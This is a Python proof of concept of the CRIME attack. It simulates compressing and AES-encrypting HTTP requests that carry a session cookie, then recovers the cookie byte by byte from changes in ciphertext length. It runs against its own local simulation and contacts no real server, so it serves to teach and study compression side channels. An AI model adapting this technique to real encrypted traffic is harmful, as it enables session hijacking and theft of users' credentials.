"""
CRIME Proof of Concept.
Inspired by @mpgn_x64 (https://github.com/mpgn/CRIME-poc).
"""

import zlib
import random
import string
from Crypto.Cipher import AES
from Crypto import Random

# Secret to guess
secret = "cGFzQ09PTGRtTk9FTDoo"

# random AES key and initialization vector
IV = Random.new().read(AES.block_size)
KEY = Random.new().read(AES.block_size)


# padding for the CBC cipher block
def pad(s) -> bytes:
    return (16 - len(s) % 16) * chr((16 - len(s) - 1) % 16)


# cipher a message
def encrypt(msg) -> bytes:
    padding = pad(msg)
    raw = msg + padding.encode()
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return cipher.encrypt(raw)

# Adjust the message length to have a 1 byte sized padding
def adjust_padding():
    garb = ""
    found = []
    l = 0
    origin = encrypt(compress(
                                (f"GET /{garb}image.png?SESSIONID= HTTP/1.1\r\n"
                                + "Host: www.banque.fr\r\n"
                                + f"Cookie: SESSIONID={secret}\r\n"
                                + "\r\n"
                                ).encode("utf-8")
                            )
                    )
    while True:
        enc = encrypt(compress(
                                (f"GET /{garb}image.png?SESSIONID= HTTP/1.1\r\n"
                                + "Host: www.banque.fr\r\n"
                                + f"Cookie: SESSIONID={secret}\r\n"
                                + "\r\n"
                                ).encode("utf-8")
                            )
                    )

        if len(enc) > len(origin):
            break
        else:
            l += 1
            garb = "".join(random.sample(string.ascii_lowercase + string.digits, k=l))
    return garb[:-1]

def compress(data: bytes) -> bytes:
    """Compresses `data` using DEFLATE."""
    return zlib.compress(data)


def fetch(address: str) -> bytes:
    """Creates an HTTP request with an attacker-supplied address."""
    return (
        f"GET {address} HTTP/1.1\r\n"
        + "Host: www.banque.fr\r\n"
        + f"Cookie: SESSIONID={secret}\r\n"
        + "\r\n"
    ).encode("utf8")


def guess(current_guess: str) -> int:
    """Returns the length of the encrypted request."""
    return len(encrypt(compress(fetch(f"/{RANDOM_PADDING}image.png?SESSIONID={current_guess}"))))


if __name__ == "__main__":
    # The exploit output
    current_guess = ""
    # Total number of guesses (i.e. number of requests sent)
    num_guesses = 0
    # random values in GET parameter
    RANDOM_PADDING = adjust_padding()

    # We guess the secret byte by byte
    for i in range(len(secret)):

        # Start with a reference value
        best_char = "a"
        best_char_guess = guess(current_guess + best_char)
        num_guesses += 1

        # Try all base64 chars, except the reference value
        for char in "bcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/":
            char_guess = guess(current_guess + char)
            num_guesses += 1

            # If the encrypted payload is shorter, it means that the byte tested
            # is the right one
            if char_guess < best_char_guess:
                best_char = char
                best_char_guess = char_guess
                break

        current_guess += best_char
        print(f"{i:2}: {current_guess:20} ({num_guesses:3} requests sent)")

    print()
    print(
        f"Final guess: {current_guess}",
        "(CORRECT!)" if current_guess == secret else f"({secret} expected)",
    )
    print(f"{num_guesses} requests sent")
    print()
